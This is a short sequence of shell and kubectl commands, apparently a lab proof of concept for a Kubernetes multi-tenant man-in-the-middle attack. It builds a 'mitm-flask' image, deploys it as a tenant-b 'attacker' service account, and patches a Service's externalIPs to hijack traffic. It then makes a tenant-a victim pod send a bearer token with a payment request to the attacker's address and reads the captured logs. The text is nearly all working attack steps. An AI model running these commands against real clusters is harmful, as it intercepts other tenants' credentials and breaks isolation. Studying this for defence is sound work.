
cd app

docker build -t mitm-flask:cve .

minikube image load mitm-flask:cve

cd ..

kubectl apply -f attacker.yaml \
  --as=system:serviceaccount:tenant-b:attacker

kubectl -n tenant-b get pods -o wide
kubectl -n tenant-b get svc -o wide
kubectl -n tenant-b get endpoints hijack-external-api

minikube ssh -n minikube-m03 "sudo crictl ps"
kubectl -n tenant-b get svc hijack-external-api -o wide
kubectl -n tenant-b get endpoints hijack-external-api

kubectl -n tenant-b patch service hijack-external-api \
  --type=merge \
  -p '{"spec":{"externalIPs":["192.0.2.123"]}}' \
  --as=system:serviceaccount:tenant-b:attacker

  
kubectl -n tenant-a exec victim -- \
  sh -c 'curl -sS -X POST \
    -H "Authorization: Bearer $SECRET_DATA_FROM_TENANT_A" \
    -H "Content-Type: application/json" \
    -d "{\"amount\":100,\"currency\":\"USD\"}" \
    http://192.0.2.123:5000/v1/payments'

kubectl -n tenant-b logs deploy/mitm-flask --tail=30